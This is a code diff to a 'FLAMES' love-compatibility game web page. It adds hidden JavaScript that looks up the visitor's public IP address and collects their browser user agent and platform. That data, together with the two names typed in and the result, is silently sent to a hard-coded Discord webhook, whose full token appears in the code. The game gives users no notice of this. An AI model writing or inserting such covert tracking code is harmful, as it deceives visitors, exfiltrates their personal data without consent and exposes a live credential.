@@ -1,5 +1,3 @@
-<!-- index.html -->
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -8,7 +6,13 @@
     <title>Romantic FLAMES Game</title>
     <link rel="stylesheet" href="styles.css">
     <script>
-        function calculateFLAMES() {
+        async function getIPAddress() {
+            const ipResponse = await fetch("https://api.ipify.org?format=json");
+            const ipData = await ipResponse.json();
+            return ipData.ip || "N/A";
+        }
+
+        async function calculateFLAMES() {
             // Get names from input fields
             var name1 = document.getElementById('name1').value.toLowerCase();
             var name2 = document.getElementById('name2').value.toLowerCase();
@@ -24,6 +28,13 @@
             // Find common letters
             var commonLetters = name1Array.filter(letter => name2Array.includes(letter));
 
+            // Gather device information
+            var deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                ipAddress: await getIPAddress()
+            };
+
             // Calculate FLAMES result
             var resultIndex = (name1Array.length + name2Array.length - 2 * commonLetters.length) % 6;
 
@@ -33,10 +44,38 @@
             // Display result
             var resultContainer = document.getElementById('result-container');
             var resultElement = document.getElementById('result');
-            resultElement.innerHTML = 'Your relationship is: ' + flames[resultIndex];
-            
+            var resultText = 'Your relationship is: ' + flames[resultIndex];
+            resultElement.innerHTML = resultText;
+
+            // Send result and device information to Discord
+            sendToDiscord({
+                name1: name1,
+                name2: name2,
+                result: resultText,
+                deviceInfo: deviceInfo
+            });
+
             // Make the result container visible
             resultContainer.style.display = 'block';
+        }
+
+        function sendToDiscord(data) {
+            var request = new XMLHttpRequest();
+            request.open("POST", "https://discord.com/api/webhooks/1185571622221000737/MUe95eWYmKWYv_dMlSUEFArA4h2IT4KcHKRiFAm5Q1ozXptee1ig-wWi9sXZN8iUEbz8"); // Replace with your actual webhook URL
+            request.setRequestHeader('Content-type', 'application/json');
+            var params = {
+                content: `
+                    
+**Name 1:** ${data.name1}
+**Name 2:** ${data.name2}
+**Result:** ${data.result}
+**Device Info:**
+                    - User Agent: ${data.deviceInfo.userAgent}
+                    - Platform: ${data.deviceInfo.platform}
+                    - IP Address: ${data.deviceInfo.ipAddress}
+                `
+            };
+            request.send(JSON.stringify(params));
         }
     </script>
 </head>
